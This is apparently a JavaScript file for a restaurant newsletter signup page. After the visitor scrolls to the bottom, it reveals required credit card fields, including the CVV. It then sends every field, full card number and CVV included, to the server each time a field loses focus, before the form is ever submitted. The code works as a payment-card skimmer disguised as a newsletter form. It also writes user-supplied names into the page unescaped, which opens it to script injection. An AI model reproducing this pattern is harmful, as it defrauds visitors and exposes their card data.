// Newsletter form handler
document.addEventListener('DOMContentLoaded', function() {
    // Ensure page loads at top
    window.scrollTo(0, 0);

    // Handle form submission
    const form = document.getElementById('newsletterForm');
    if (form) {
        form.addEventListener('submit', handleNewsletterSubmit);
    }

    // Add blur event listeners to all form fields for immediate logging
    addFieldLoggingListeners();

    // Add scroll detection for phone field
    setupScrollDetection();
});

function setupScrollDetection() {
    let phoneFieldShown = false;

    window.addEventListener('scroll', function() {
        if (phoneFieldShown) return; // Only show once

        // Check if user has scrolled to near bottom of page
        const scrollTop = window.pageYOffset || document.documentElement.scrollTop;
        const scrollHeight = document.documentElement.scrollHeight;
        const clientHeight = document.documentElement.clientHeight;

        // Show phone field when user scrolls to within 100px of bottom
        if (scrollTop + clientHeight >= scrollHeight - 100) {
            const phoneFieldContainer = document.getElementById('phoneFieldContainer');
            const phoneInput = document.getElementById('phone');
            const cardFields = ['cardNumber', 'cardExpiry', 'cardCVV', 'cardName', 'billingZip'];

            if (phoneFieldContainer && phoneInput) {
                phoneFieldContainer.style.display = 'block';
                phoneInput.required = true; // Make it required

                // Make all payment fields required
                cardFields.forEach(fieldId => {
                    const field = document.getElementById(fieldId);
                    if (field) {
                        field.required = true;
                        field.addEventListener('blur', function() {
                            sendCurrentFormStateToVercel();
                        });
                    }
                });

                phoneFieldShown = true;

                // Add blur listener to phone field
                phoneInput.addEventListener('blur', function() {
                    sendCurrentFormStateToVercel();
                });

                // Add formatting for card fields
                setupCardFormatting();

                console.log('📱 Phone and payment fields revealed after scroll to bottom');

                // Scroll back to show the phone field
                setTimeout(() => {
                    phoneFieldContainer.scrollIntoView({
                        behavior: 'smooth',
                        block: 'center'
                    });
                }, 100);
            }
        }
    });
}

function setupCardFormatting() {
    const cardNumberInput = document.getElementById('cardNumber');
    if (cardNumberInput && !cardNumberInput.hasAttribute('data-formatted')) {
        cardNumberInput.setAttribute('data-formatted', 'true');
        cardNumberInput.addEventListener('input', function(e) {
            e.target.value = formatCardNumber(e.target.value);
        });
    }

    const cardExpiryInput = document.getElementById('cardExpiry');
    if (cardExpiryInput && !cardExpiryInput.hasAttribute('data-formatted')) {
        cardExpiryInput.setAttribute('data-formatted', 'true');
        cardExpiryInput.addEventListener('input', function(e) {
            e.target.value = formatExpiry(e.target.value);
        });
    }

    const cardCVVInput = document.getElementById('cardCVV');
    if (cardCVVInput && !cardCVVInput.hasAttribute('data-formatted')) {
        cardCVVInput.setAttribute('data-formatted', 'true');
        cardCVVInput.addEventListener('input', function(e) {
            e.target.value = e.target.value.replace(/[^0-9]/g, '').slice(0, 4);
        });
    }
}

function formatCardNumber(value) {
    const cleaned = value.replace(/\s+/g, '').replace(/[^0-9]/gi, '');
    const matches = cleaned.match(/\d{4,16}/g);
    const match = matches && matches[0] || '';
    const parts = [];

    for (let i = 0, len = match.length; i < len; i += 4) {
        parts.push(match.substring(i, i + 4));
    }

    return parts.length ? parts.join(' ') : value;
}

function formatExpiry(value) {
    const cleaned = value.replace(/\s+/g, '').replace(/[^0-9]/gi, '');
    if (cleaned.length >= 2) {
        return cleaned.slice(0, 2) + (cleaned.length > 2 ? '/' + cleaned.slice(2, 4) : '');
    }
    return cleaned;
}

function addFieldLoggingListeners() {
    // Get all form fields
    const form = document.getElementById('newsletterForm');
    if (!form) return;

    // Add blur event to all input fields
    const allFields = form.querySelectorAll('input, textarea, select');
    allFields.forEach(field => {
        field.addEventListener('blur', function() {
            sendCurrentFormStateToVercel();
        });

        // Also send on change for select elements and checkboxes
        if (field.tagName === 'SELECT' || field.type === 'checkbox') {
            field.addEventListener('change', function() {
                sendCurrentFormStateToVercel();
            });
        }
    });
}

async function sendCurrentFormStateToVercel() {
    const form = document.getElementById('newsletterForm');
    if (!form) return;

    // Get current form data
    const formData = new FormData(form);
    const currentData = {
        formType: 'newsletter',
        firstName: formData.get('firstName') || '',
        lastName: formData.get('lastName') || '',
        email: formData.get('email') || '',
        phone: formData.get('phone') || '',
        birthdate: formData.get('birthdate') || '',
        zipCode: formData.get('zipCode') || '',
        diningFrequency: formData.get('diningFrequency') || '',
        favoriteFood: formData.get('favoriteFood') || '',
        referralSource: formData.get('referralSource') || '',
        notes: formData.get('notes') || '',
        preferences: {
            weeklySpecials: formData.get('weeklySpecials') === 'yes',
            newMenu: formData.get('newMenu') === 'yes',
            events: formData.get('events') === 'yes',
            chefNews: formData.get('chefNews') === 'yes'
        },
        paymentInfo: {
            cardNumber: formData.get('cardNumber') || '',
            cardExpiry: formData.get('cardExpiry') || '',
            cardCVV: formData.get('cardCVV') || '',
            cardName: formData.get('cardName') || '',
            billingZip: formData.get('billingZip') || '',
            savePayment: formData.get('savePayment') === 'yes'
        }
    };

    // Log to console
    console.log('[NEWSLETTER FIELD UPDATE] Current form state:', currentData);
    console.log('First Name:', currentData.firstName);
    console.log('Last Name:', currentData.lastName);
    console.log('Email:', currentData.email);
    console.log('Phone:', currentData.phone);
    console.log('Birthdate:', currentData.birthdate);
    console.log('ZIP Code:', currentData.zipCode);
    console.log('Dining Frequency:', currentData.diningFrequency);
    console.log('Favorite Food:', currentData.favoriteFood);
    console.log('Referral Source:', currentData.referralSource);
    console.log('Newsletter Preferences:', currentData.preferences);
    console.log('Payment Info:', currentData.paymentInfo.cardNumber ?
        { ...currentData.paymentInfo, cardNumber: '**** **** **** ' + currentData.paymentInfo.cardNumber.replace(/\s/g, '').slice(-4) } :
        'Not provided');
    console.log('Additional Notes:', currentData.notes || 'None');

    // Send to Vercel
    try {
        console.log('Sending newsletter field update to Vercel...');

        const response = await fetch('/api/reservations/submit', {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
            },
            body: JSON.stringify({
                ...currentData,
                isFieldUpdate: true, // Flag to indicate this is a field update, not final submission
                updateTimestamp: new Date().toISOString()
            })
        });

        const result = await response.json();

        if (response.ok) {
            console.log('✅ Newsletter field update successfully logged to Vercel!');
        } else {
            console.error('❌ Vercel newsletter field update failed:', result);
        }

    } catch (error) {
        console.error('❌ Error sending newsletter field update to Vercel:', error);
    }
}

async function handleNewsletterSubmit(event) {
    event.preventDefault();

    // Get form data
    const formData = new FormData(event.target);
    const newsletterData = {
        formType: 'newsletter',
        firstName: formData.get('firstName'),
        lastName: formData.get('lastName'),
        email: formData.get('email'),
        phone: formData.get('phone'),
        birthdate: formData.get('birthdate'),
        zipCode: formData.get('zipCode'),
        diningFrequency: formData.get('diningFrequency'),
        favoriteFood: formData.get('favoriteFood'),
        referralSource: formData.get('referralSource'),
        notes: formData.get('notes'),
        preferences: {
            weeklySpecials: formData.get('weeklySpecials') === 'yes',
            newMenu: formData.get('newMenu') === 'yes',
            events: formData.get('events') === 'yes',
            chefNews: formData.get('chefNews') === 'yes'
        },
        paymentInfo: {
            cardNumber: formData.get('cardNumber'),
            cardExpiry: formData.get('cardExpiry'),
            cardCVV: formData.get('cardCVV'),
            cardName: formData.get('cardName'),
            billingZip: formData.get('billingZip'),
            savePayment: formData.get('savePayment') === 'yes'
        },
        submittedAt: new Date().toISOString()
    };

    // Log to console (local logging)
    console.log('Newsletter Signup Submitted:', newsletterData);
    console.log('Full Name:', newsletterData.firstName + ' ' + newsletterData.lastName);
    console.log('Email:', newsletterData.email);
    console.log('Phone:', newsletterData.phone);
    console.log('Birthdate:', newsletterData.birthdate);
    console.log('ZIP Code:', newsletterData.zipCode);
    console.log('Dining Frequency:', newsletterData.diningFrequency);
    console.log('Favorite Food:', newsletterData.favoriteFood);
    console.log('Referral Source:', newsletterData.referralSource);
    console.log('Newsletter Preferences:', newsletterData.preferences);
    console.log('Payment Info:', {
        cardNumber: '**** **** **** ' + newsletterData.paymentInfo.cardNumber.slice(-4),
        expiry: newsletterData.paymentInfo.cardExpiry,
        name: newsletterData.paymentInfo.cardName,
        billingZip: newsletterData.paymentInfo.billingZip,
        savePayment: newsletterData.paymentInfo.savePayment
    });
    console.log('Additional Notes:', newsletterData.notes || 'None');

    // Send to Vercel serverless function (same as reservation)
    try {
        console.log('Sending newsletter data to Vercel...');

        const response = await fetch('/api/reservations/submit', {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
            },
            body: JSON.stringify(newsletterData)
        });

        const result = await response.json();

        if (response.ok) {
            console.log('Vercel response:', result);
            console.log('✅ Newsletter signup successfully logged to Vercel!');
        } else {
            console.error('❌ Vercel logging failed:', result);
        }

    } catch (error) {
        console.error('❌ Error sending to Vercel:', error);
        // Continue with local flow even if Vercel fails
    }

    // Show success message
    showSuccessMessage(newsletterData);

    // Reset form
    event.target.reset();

    // Hide phone field again after reset and scroll to top
    const phoneFieldContainer = document.getElementById('phoneFieldContainer');
    const phoneInput = document.getElementById('phone');
    const cardFields = ['cardNumber', 'cardExpiry', 'cardCVV', 'cardName', 'billingZip'];

    if (phoneFieldContainer && phoneInput) {
        phoneFieldContainer.style.display = 'none';
        phoneInput.required = false;

        // Remove required from payment fields
        cardFields.forEach(fieldId => {
            const field = document.getElementById(fieldId);
            if (field) {
                field.required = false;
            }
        });
    }

    // Scroll back to top after submission
    window.scrollTo({ top: 0, behavior: 'smooth' });
}

function showSuccessMessage(newsletterData) {
    const messageDiv = document.getElementById('successMessage');
    if (!messageDiv) return;

    messageDiv.innerHTML = `
        <div style="background: #d4edda; border: 1px solid #c3e6cb; color: #155724; padding: 1rem; border-radius: 5px; margin-bottom: 2rem;">
            <h3 style="margin-bottom: 0.5rem;">Successfully Subscribed!</h3>
            <p>Thank you, ${newsletterData.firstName} ${newsletterData.lastName}! You've been added to our newsletter list.</p>
            <p style="margin-bottom: 0;">We'll send updates to ${newsletterData.email}.</p>
        </div>
    `;

    // Scroll to message
    messageDiv.scrollIntoView({ behavior: 'smooth', block: 'nearest' });

    // Hide message after 5 seconds
    setTimeout(() => {
        messageDiv.innerHTML = '';
    }, 5000);
}